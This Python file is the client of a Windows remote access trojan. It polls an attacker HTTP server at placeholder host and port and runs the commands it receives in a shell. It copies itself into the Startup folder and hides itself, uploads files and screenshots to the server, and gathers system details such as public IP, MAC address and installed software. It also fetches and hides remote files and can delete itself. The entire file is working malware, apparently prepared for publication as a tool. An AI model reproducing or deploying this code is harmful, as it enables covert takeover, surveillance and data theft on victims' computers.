import os
import re
import time
import uuid
import psutil
import random
import getpass
import datetime
import requests
import platform
import pyautogui
import subprocess

HOST = "XHOST"
PORT = int("XPORT")
ADDRESS = f"http://{HOST}:{PORT}"
TIME_TO_RECONNECT = random.randint(0, 5)

def auto_run():
    STARTUP_PATH = r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(getpass.getuser())
    file_name = os.path.basename(__file__)    # the currane file/script name
    file_in_startup = STARTUP_PATH + "\\" + file_name
    if os.path.isfile(file_in_startup):
        requests.post(url = ADDRESS, data = f"[+] Shell is already @ [{STARTUP_PATH}]")
    else:
        try:
            # read the currant file content
            with open(__file__,"rb") as file:
                content = file.read()
            # write the file in the startup directory
            with open(file_in_startup,"wb") as final:
                final.write(content)
            if os.path.isfile(file_in_startup):
                os.chdir(STARTUP_PATH) # change directory to the startup directory
                os.system(f'attrib +h "{file_name}"') # make the shell hidden
                requests.post(url = ADDRESS, data = f"[+] Shell is hidding @[{STARTUP_PATH}]")
        except Exception as error:
            requests.post(url = ADDRESS, data = f"[-] Error msg:\n{str(error)}")


def md5(command):
    _, file_name = command[0:3], command[4::]
    C_output, C_error = cmd("CertUtil -hashfile {0} MD5".format(file_name))
    requests.post(url=ADDRESS, data=f"{C_output} \n {C_error}")


def kill():
    os.chdir(os.path.dirname(__file__))
    os.system(f"del {0}".format(os.path.basename(__file__)))
    exit(0)

def snapshot():
    DOWNLOAD_PATH = r"C:\Users\Public\Pictures"
    os.chdir(DOWNLOAD_PATH)
    # get screenshot object
    my_screenshot = pyautogui.screenshot()
    screen_name = "client_screen.png"
    my_screenshot.save(screen_name)     # save the screenshot
    if os.path.isfile(f"{DOWNLOAD_PATH}\\{screen_name}"):
        url = ADDRESS + "/store"        # redirect to the store address @ serevr side
        files = {'file': open(f"{DOWNLOAD_PATH}\{screen_name}", 'rb')}
        requests.post(url, files = files)
        os.remove(screen_name)


def read(command):
    command, file = command[0:4], command[5::]
    if os.path.isfile(file):
        C_output, C_error = cmd(f"type {file}")
        requests.post(url = ADDRESS, data = f"{C_output}\n{C_error}")
    else:
        requests.post(url = ADDRESS, data = f"I can't read this file\n may be you don't have the permission")


def list_software():
    """ returning a list of all installed softwares """

    command_result = "List of all installed software:\n\n"
    data = subprocess.check_output(['wmic', 'product', 'get', 'name'])
    data = str(data)
    try:
        for i in range(len(data)):
            command_result += "{0}\n".format(data.split("\\r\\r\\n")[6:][i])
    except IndexError as e:
        command_result += "\n=================================\n"
    requests.post(url = ADDRESS, data = command_result)


def cmd(command):
    """[ function to run commands on target machine ]
    Args:
        command ([string]): [command from the attacker]
    Returns:
        command_result([tuple]): [two values, command output and command error]
    """

    command_result = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    command_stdout = command_result.stdout.read().decode()
    command_stderr = command_result.stderr.read().decode()
    return (command_stdout, command_stderr)


def system_info():
    """ Function return some of system information """

    sys_info = f"""\n
    System Info Summary
    +++++++++++++++++++
    System Type         : {platform.uname().system}
    Computer Name       : {platform.uname().node}
    Currant login User  : {getpass.getuser()}
    System Release      : {platform.uname().release}
    System Version      : {platform.uname().version}
    Machine Architectur : {platform.uname().machine}
    Public IP Address   : {requests.get('https://api.ipify.org').text}
    MAC Address         : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
    Shell Path          : {__file__}
    Currant Time        : {datetime.datetime.now().time()}
    Boot Time           : {datetime.datetime.fromtimestamp(psutil.boot_time())}
    =======================================================\n"""
    requests.post(url = ADDRESS, data = sys_info)


# It was working very well but now before publishing the tool it crashes :)
# I will make the necessary adjustments to make it work again

# def find_with(command):
#     command = command[5:]                   # delete find keyword
#     extension, path = command.split("@")    # split the command for extension and path
#     results = [] # result variable
#     requests.post(url = ADDRESS, data = "[+] Searching. . .\n")
#     # using os.walk
#     for directory, _, files in os.walk(path):
#         for file in files:
#             # check if file ends with our extension
#             if file.endswith(f".{extension}"):
#                 results = results + "\n" + os.path.join(directory, file)
#     if results == "":
#         requests.post(url = ADDRESS, data = "[-] No {0}@{1} Directory!".format(extension, path))
#     else:
#         requests.post(url = ADDRESS, data = "[+] Final Results:\n")
#         requests.post(url = ADDRESS, data = results)


def download(file_name, url):
    """[ Function to download files from attacker server ]
    Args:
        file_name ([string])
        url ([string])
    """
    DOWNLOAD_PATH = r"C:\Users\Public\Pictures"
    seconds_counter = 0
    try:
        print(DOWNLOAD_PATH)
        os.chdir(DOWNLOAD_PATH)
        command = f"curl.exe --output {file_name} --url {str(url)}" # download file from url
        cout, cerr = cmd(command)
        while True:
            if os.path.isfile(f"{DOWNLOAD_PATH}\\{file_name}"):# check if the file downloaded
                requests.post(url = ADDRESS, data = f"{cout} \n\n {cerr}")
                requests.post(url = ADDRESS, data = f"[+] File was downloaded successfully! @{DOWNLOAD_PATH}")
                cmd(f"attrib +h {file_name}")
                break
            else:
                time.sleep(1)
                seconds_counter += 1
                requests.post(url = ADDRESS, data = "[-] Wait seccond plz!")
                if seconds_counter == 10:
                    break
    except Exception as error:
        requests.post(url = ADDRESS, data = str(error).encode())


def main():

    shell_options = ["auto_run", "get", "cd", "download", "read", "kill", "list_software","find", "system_info", "snapshot", "cd", "send", "md5"]

    while True:
        try:

            incomming_command = requests.get(ADDRESS)
            command = incomming_command.text
            temp_command = incomming_command.text
            if command.split(" ")[0] in shell_options:

                
                # Navigation system
                if command.split(" ")[0] == "cd":
                    _, path = command[0:2], command[3::]
                    if os.path.isdir(path):
                        os.chdir(path)
                        requests.post(url = ADDRESS, data = f"\nCWD: {os.getcwd()}\n")
                    else:
                        requests.post(url = ADDRESS, data = f"[-] Invalid Path")


                # Auto Run function calling
                elif command.split(" ")[0] == "auto_run":
                    auto_run()

                
                # Download files from target machine.
                elif command.split(" ")[0] == "get":
                    _, path = command[0:3], command[4::]
                    if os.path.exists(path):
                        # redirect to the store file @ serevr side
                        url = ADDRESS + "/store"
                        files = {'file': open(path, 'rb')}
                        requests.post(url, files = files)
                    else:
                        requests.post(url = ADDRESS, data = '[-] Unable to find the file!'.encode())


                # Uploading files from attacker machine or any external source.
                elif command.split(" ")[0] == "send":
                    _, addr = temp_command[0:4], temp_command[5::]
                    file_name, url = addr.split("@")
                    download(file_name, url)


                # Taking screenshot from target machine.
                elif command == "snapshot":
                    snapshot()


                # find command
                #elif command.split(" ")[0] == "find":
                    #find_with(command)


                # getting system info
                elif command.split(" ")[0] == "system_info":
                    system_info()


                # getting a list of all installed software
                elif command.split(" ")[0] == "list_software":
                    list_software()


                # calc md5
                elif command.split(" ")[0] == "md5":
                    md5(temp_command)


                # reading files
                elif command.split(" ")[0] == "read":
                    read(temp_command)


                # elif command.split(" ")[0] == "find":
                #     print(command)
                #     find_with(command)


                # killing the shell.
                elif command.split(" ")[0] == "kill":
                    kill()


            else:
                C_output, C_error = cmd(incomming_command)
                requests.post(url = ADDRESS, data = f"{C_output}\n{C_error}")


        except:
            time.sleep(TIME_TO_RECONNECT)


if __name__ == "__main__":
    # calling main function
    while True:
        main()

